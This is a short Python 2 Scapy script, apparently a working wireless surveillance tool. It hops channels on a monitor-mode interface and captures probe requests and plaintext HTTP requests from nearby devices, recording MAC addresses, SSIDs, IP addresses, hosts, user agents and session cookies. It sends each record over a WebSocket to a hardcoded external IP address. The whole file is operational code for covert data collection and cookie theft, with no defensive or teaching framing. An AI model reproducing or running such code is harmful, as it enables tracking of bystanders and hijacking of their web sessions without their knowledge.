from scapy.all import *
import scapy_http.http as HTTP
import json
import websocket
import threading
import time
import itertools
import os


s = 'ws://123.207.63.246:9501'
w = websocket.WebSocket()
w.connect(s)


def tiao():
    for i in itertools.cycle(range(100)):
        os.system('iwconfig mon0 channel %d' % (i % 3 * 5 + 1))
        time.sleep(1)


def prn(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        data = ['0', pkt.addr2, pkt.info]
        try:
            w.send(json.dumps(data))
        except Exception, e:
            print e
            w.connect(s)

    elif pkt.haslayer(HTTP.HTTPRequest):
        data = ['1', pkt.addr2, pkt[IP].src, pkt[IP].dst, pkt.Host, pkt.Cookie, pkt.getfieldval('User-Agent')]
        try:
            w.send(json.dumps(data))
        except Exception, e:
            print e
            w.connect(s)


thread = threading.Thread(target=tiao)
thread.setDaemon(True)
thread.start()


sniff(iface='mon0', filter='wlan[0]=0x40 or (ip[9:1]==6 and tcp[13:1]&8==8)', prn=prn)
